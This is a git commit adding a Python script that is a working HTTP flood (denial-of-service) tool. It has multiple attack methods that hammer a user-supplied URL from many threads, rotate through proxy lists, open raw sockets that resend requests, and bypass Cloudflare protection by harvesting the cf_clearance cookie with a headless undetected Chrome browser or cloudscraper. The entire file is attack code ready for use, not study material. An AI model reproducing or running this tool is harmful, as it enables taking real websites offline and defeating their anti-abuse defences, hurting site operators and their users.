7d8f799f68b6d584ccc103c449041064c9eaf004
nbverter <99184316+nbverter@users.noreply.github.com>
2022-09-18 15:46:56 +0300

    Add files via upload

---
+++ script.py
@@ -0,0 +1,443 @@
+# -*- coding: utf-8 -*-
+from os import system, name
+import os, threading, requests, cloudscraper, datetime, time, socket, socks, ssl, random, sys
+from urllib.parse import urlparse
+from requests.cookies import RequestsCookieJar
+import undetected_chromedriver as webdriver
+from sys import stdout
+from colorama import Fore, init
+init(convert=True)
+
+def countdown(t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    while True:
+        if (until - datetime.datetime.now()).total_seconds() > 0:
+            stdout.flush()
+            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
+        else:
+            stdout.flush()
+            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                   \n")
+            return
+
+#region get
+def get_target(url):
+    url = url.rstrip()
+    target = {}
+    target['uri'] = urlparse(url).path
+    if target['uri'] == "":
+        target['uri'] = "/"
+    target['host'] = urlparse(url).netloc
+    target['scheme'] = urlparse(url).scheme
+    if ":" in urlparse(url).netloc:
+        target['port'] = urlparse(url).netloc.split(":")[1]
+    else:
+        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
+        pass
+    return target
+
+def get_proxies():
+    global proxies
+    if not os.path.exists("./proxy.txt"):
+        stdout.write(Fore.MAGENTA+" [*]"+Fore.WHITE+" You Need Proxy File ( ./proxy.txt )\n")
+        return False
+    proxies = open("./proxy.txt", 'r').read().split('\n')
+    return True
+
+def get_cookie(url):
+    global useragent, cookieJAR, cookie
+    options = webdriver.ChromeOptions()
+    arguments = [
+    '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
+    '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
+    '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en' 
+    ]
+    for argument in arguments:
+        options.add_argument(argument)
+    driver = webdriver.Chrome(options=options)
+    driver.implicitly_wait(3)
+    driver.get(url)
+    for _ in range(60):
+        cookies = driver.get_cookies()
+        tryy = 0
+        for i in cookies:
+            if i['name'] == 'cf_clearance':
+                cookieJAR = driver.get_cookies()[tryy]
+                useragent = driver.execute_script("return navigator.userAgent")
+                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
+                driver.quit()
+                return True
+            else:
+                tryy += 1
+                pass
+        time.sleep(1)
+    driver.quit()
+    return False
+
+def get_info():
+    stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     "+Fore.RED+": "+Fore.LIGHTGREEN_EX)
+    target = input()
+    stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  "+Fore.RED+": "+Fore.LIGHTGREEN_EX)
+    thread = input()
+    stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) "+Fore.RED+": "+Fore.LIGHTGREEN_EX)
+    t = input()
+    return target, thread, t
+#endregion
+
+#region METHOD
+
+#region HEAD
+def LaunchHEAD(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackHEAD, args=(url, until))
+            thd.start()
+        except:
+            pass
+
+def AttackHEAD(url, until_datetime):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            requests.head(url)
+            requests.head(url)
+        except:
+            pass
+#endregion
+
+#region POST
+def LaunchPOST(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackPOST, args=(url, until))
+            thd.start()
+        except:
+            pass
+
+def AttackPOST(url, until_datetime):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            requests.post(url)
+            requests.post(url)
+        except:
+            pass
+#endregion
+
+#region RAW
+def LaunchRAW(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackRAW, args=(url, until))
+            thd.start()
+        except:
+            pass
+
+def AttackRAW(url, until_datetime):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            requests.get(url)
+            requests.get(url)
+        except:
+            pass
+#endregion
+
+#region PXRAW
+def LaunchPXRAW(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackPXRAW, args=(url, until))
+            thd.start()
+        except:
+            pass
+
+def AttackPXRAW(url, until_datetime):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        proxy = 'http://'+str(random.choice(list(proxies)))
+        proxy = {
+            'http': proxy,   
+            'https': proxy,
+        }
+        try:
+            requests.get(url, proxies=proxy)
+            requests.get(url, proxies=proxy)
+        except:
+            pass
+#endregion
+
+#region PXSOC
+def LaunchPXSOC(url, th, t):
+    target = get_target(url)
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    req =  "GET " +target['uri'] + " HTTP/1.1\r\n"
+    req += "Host: " + target['host'] + "\r\n"
+    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
+    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+    req += "Connection: Keep-Alive\r\n\r\n"
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackPXSOC, args=(target, until, req))
+            thd.start()
+        except:
+            pass
+
+def AttackPXSOC(target, until_datetime, req):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            proxy = random.choice(list(proxies)).split(":")
+            if target['scheme'] == 'https':
+                s = socks.socksocket()
+                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
+                s.connect((str(target['host']), int(target['port'])))
+                s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
+            else:
+                s = socks.socksocket()
+                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
+                s.connect((str(target['host']), int(target['port'])))
+            try:
+                for _ in range(100):
+                    s.send(str.encode(req))
+            except:
+                s.close()
+        except:
+            return
+#endregion
+
+#region SOC
+def LaunchSOC(url, th, t):
+    target = get_target(url)
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
+    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
+    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+    req += "Connection: Keep-Alive\r\n\r\n"
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackSOC, args=(target, until, req))
+            thd.start()
+        except:
+            pass
+
+def AttackSOC(target, until_datetime, req):
+    if target['scheme'] == 'https':
+        s = socks.socksocket()
+        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        s.connect((str(target['host']), int(target['port'])))
+        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
+    else:
+        s = socks.socksocket()
+        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        s.connect((str(target['host']), int(target['port'])))
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            try:
+                for _ in range(100):
+                    s.send(str.encode(req))
+            except:
+                s.close()
+        except:
+            pass
+#endregion
+
+#region CFB
+def LaunchCFB(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    scraper = cloudscraper.create_scraper()
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
+            thd.start()
+        except:
+            pass
+
+def AttackCFB(url, until_datetime, scraper):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            scraper.get(url, timeout=15)
+            scraper.get(url, timeout=15)
+        except:
+            pass
+#endregion
+
+#region PXCFB
+def LaunchPXCFB(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    scraper = cloudscraper.create_scraper()
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper))
+            thd.start()
+        except:
+            pass
+
+def AttackPXCFB(url, until_datetime, scraper):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            proxy = {
+                    'http': 'http://'+str(random.choice(list(proxies))),   
+                    'https': 'http://'+str(random.choice(list(proxies))),
+            }
+            scraper.get(url, proxies=proxy)
+            scraper.get(url, proxies=proxy)
+        except:
+            pass
+#endregion
+
+#region CFPRO
+def LaunchCFPRO(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    session = requests.Session()
+    scraper = cloudscraper.create_scraper(sess=session)
+    jar = RequestsCookieJar()
+    jar.set(cookieJAR['name'], cookieJAR['value'])
+    scraper.cookies = jar
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackCFPRO, args=(url, until, scraper))
+            thd.start()
+        except:
+            pass
+
+def AttackCFPRO(url, until_datetime, scraper):
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
+        'Cache-Control': 'no-cache',
+        'Pragma': 'no-cache',
+        'Connection': 'keep-alive',
+        'Upgrade-Insecure-Requests': '1',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': 'same-origin',
+        'Sec-Fetch-User': '?1',
+        'TE': 'trailers',
+    }
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            scraper.get(url=url, headers=headers, allow_redirects=False)
+            scraper.get(url=url, headers=headers, allow_redirects=False)
+        except:
+            pass
+#endregion
+
+#region CFSOC
+def LaunchCFSOC(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    target = get_target(url)
+    req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
+    req += 'Host: ' + target['host'] + '\r\n'
+    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
+    req += 'Accept-Encoding: gzip, deflate, br\r\n'
+    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
+    req += 'Cache-Control: max-age=0\r\n'
+    req += 'Cookie: ' + cookie + '\r\n'
+    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
+    req += 'sec-ch-ua-mobile: ?0\r\n'
+    req += 'sec-ch-ua-platform: "Windows"\r\n'
+    req += 'sec-fetch-dest: empty\r\n'
+    req += 'sec-fetch-mode: cors\r\n'
+    req += 'sec-fetch-site: same-origin\r\n'
+    req += 'Connection: Keep-Alive\r\n'
+    req += 'User-Agent: ' + useragent + '\r\n\r\n\r\n'
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackCFSOC,args=(until, target, req,))
+            thd.start()
+        except:  
+            pass
+
+def AttackCFSOC(until_datetime, target, req):
+    if target['scheme'] == 'https':
+        packet = socks.socksocket()
+        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        packet.connect((str(target['host']), int(target['port'])))
+        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
+    else:
+        packet = socks.socksocket()
+        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        packet.connect((str(target['host']), int(target['port'])))
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            for _ in range(10):
+                packet.send(str.encode(req))
+        except:
+            packet.close()
+            pass
+#endregion
+
+if __name__ == '__main__':
+    if len(sys.argv) < 5:
+        stdout.write(f"user@some_name:~# python3 {sys.argv[0]} <method> <target> <thread> <time>")
+        sys.exit()
+    method = sys.argv[1].rstrip()
+    target = sys.argv[2].rstrip()
+    thread = sys.argv[3].rstrip()
+    t      = sys.argv[4].rstrip()
+    if method == "cfb":
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchCFB(target, thread, t)
+        timer.join()
+    elif method == "pxcfb":
+        if get_proxies():
+            timer = threading.Thread(target=countdown, args=(t,))
+            timer.start()
+            LaunchPXCFB(target, thread, t)
+            timer.join()
+    elif method == "raw":
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchRAW(target, thread, t)
+        timer.join()
+    elif method == "post":
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchPOST(target, thread, t)
+        timer.join()
+    elif method == "head":
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchHEAD(target, thread, t)
+        timer.join()
+    elif method == "pxraw":
+        if get_proxies():
+            timer = threading.Thread(target=countdown, args=(t,))
+            timer.start()
+            LaunchPXRAW(target, thread, t)
+            timer.join()
+    elif method == "soc":
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchSOC(target, thread, t)
+        timer.join()
+    elif method == "pxsoc":
+        if get_proxies():
+            timer = threading.Thread(target=countdown, args=(t,))
+            timer.start()
+            LaunchPXSOC(target, thread, t)
+            timer.join()
+    elif method == "cfpro":
+        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
+        if get_cookie(target):
+            timer = threading.Thread(target=countdown, args=(t,))
+            timer.start()
+            LaunchCFPRO(target, thread, t)
+            timer.join()
+        else:
+            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
+    elif method == "cfsoc":
+        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
+        if get_cookie(target):
+            timer = threading.Thread(target=countdown, args=(t,))
+            timer.start()
+            LaunchCFSOC(target, thread, t)
+            timer.join()
+        else:
+            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
+    else:
+        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"No method\n")
